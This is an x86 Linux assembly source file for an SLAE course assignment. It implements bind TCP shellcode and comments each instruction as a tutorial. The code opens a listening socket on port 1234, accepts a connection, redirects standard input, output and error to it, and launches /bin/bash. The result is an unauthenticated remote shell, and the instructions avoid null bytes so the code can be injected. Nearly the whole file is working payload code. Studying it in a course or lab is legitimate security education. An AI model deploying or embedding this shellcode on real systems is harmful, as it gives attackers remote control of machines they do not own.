;; SLAE Assignment #1: Bind Bind TCP (Linux/x86) 
;; Website:  http://blog.jsiob.com
;; SLAE-ID: 1400


global _start

section .text
_start:

	;;;;Create a Socket;;;;

	xor eax, eax 	; First we will need to zero out these registers by XOR’ing them with themselves. 
	xor ebx, ebx	; This ensures the registers are in a clean state for usage.
	xor ecx, ecx
	
	mov al, 0x66	; Next we need to put the syscall for socketcall in EAX.	
	
	mov bl, 0x1		; We’ll need 1 to create our socket, which means we can MOV that into BL, again avoiding nulls.
					; see /usr/include/linux/net.h for more details	 
					;Since the stack is First In, Last Out or LastIn, First Out (whichever saying you prefer) we’ll need to PUSH our arguments in reverse order.
	
	push ecx		; Since ECX was zeroed out earlier we can simply do a PUSH to get our first argument of 0 onto the stack.	
	push 0x1		; The number for SOCK_STREAM is set to 1
	push 0x2		; The number for AF_INET is has a value of 2.	
		
	mov ecx, esp	; Now we point ECX to the top of the stack and call the systemcall interrupt executing all of our arguments

	int 0x80
	
	mov edi, eax	; save result (sockfd) for later usage

	
	
	;;;;Binding the Socket;;;;
	
	xor eax, eax	; First we clean the EAX register
	mov al, 0x66	; We’ll need to call socketcall() again this time with the SYS_BIND argument. So once again we’ll need to setup EAX with system call 0x66.
	mov bl, 0x2		; We see from earlier (cat /usr/include/linux/net.h) that SYS_BIND is set to 2. so we need to set the value of EBX to  2

	; Now we create the struct used in the bind call
	
	xor edx, edx	; AF_INET which is the first argument eqaul 0, we’ll start by XOR’ing out EDX, which we haven’t used yet. 
	push edx		; Then PUSH it to the stack.	 

	push word 0xd204	; Next we’ll push our port number to the stack.
	push word 0x2		; Now we push the value of AF_NET which equal to 2
			
	
	mov ecx, esp		; Now with our struct setup correctly on the stack we can point ECX to it.
	
	push 0x10		; The size of our struct is 0x10, so we’ll push that to stack.
	push ecx		; push the value of ECX since it’s currently pointing at the struct located on the stack.
	push edi		; push the pointer to our struct,
	
	mov ecx, esp	; point ECX to the top of the stack with all the arguments ready to be executed.
	
	int 0x80
	
	

	;;;;;Configuring the Socket to Listen;;;;;;
	
	

	xor eax, eax	; First we clean the EAX register	
	push eax		; Currently EAX contains 0, so we’ll PUSH that along with our socket still stored in EDI.
	push edi
	
	mov ecx, esp
	mov bl, 0x4		; We will need to store 4 in EBX
	mov al, 0x66	; Next we need to put the syscall for socketcall in EAX.
	int 0x80
	
	
	;;;;;Accept Connections;;;;

		
	xor eax, eax	; First we clean the EAX register		
	push eax		; Since EAX is null, we can push it twice the intiate our firts arguments
	push eax	

	push edi		; Next we’ll push our socketfd to the stack from EDI.
	mov bl, 0x5		; We also know that SYS_ACCEPT is defined as 5. EBX is set to 5
	mov ecx, esp	; point ECX to the top of the stack with all the arguments ready to be executed.
	
	mov al, 0x66
	int 0x80
	
		
	;;;;;Redirecting STDIN, STDOUT, and STDERR to the Client Connection;;;;;;

	
	xchg ebx, eax	;Our client socket will be returned into EAX so we’ll need to preserve that by moving it out. Since our next step will be redirecting STDIN, STDOUT, and STDERR we can move this into EBX since it will need to be there as an argument for the dup2() syscall.
	
	xor ecx, ecx	;First we’ll need to setup our counter in the counter register (ECX).
	mov cl, 0x2	
	
loop:
	mov al, 0x3f	;We’ll also need the dup2() system call number. Which we can find in /usr/include/i386-linux-gnu/asm/unistd_32.h as 63. Converted to hex that gives us 0x3f.
	int 0x80
	dec ecx	
	jns loop		;Now comes the actual loop. We’ll be using the JNS instruction which basically means continue to jump to the start of the loop until the signed flag is set. We’ll be decrementing our counter register each time, and once -1 gets set in ECX, the signed flag will be set and break the loop.

	
	
	;;;;;Execve;;;;;
	
	xor eax ,eax		; zero out eax
	push eax		; NULL
	push 0x68736162	; “hsab”
	push 0x2f6e6962	; “/nib”
	push 0x2f2f2f2f		; “////”	
	mov ebx, esp		; point ebx to stack
	mov ecx, eax		; NULL
	mov al, 0xb		; execve
	int 0x80
	
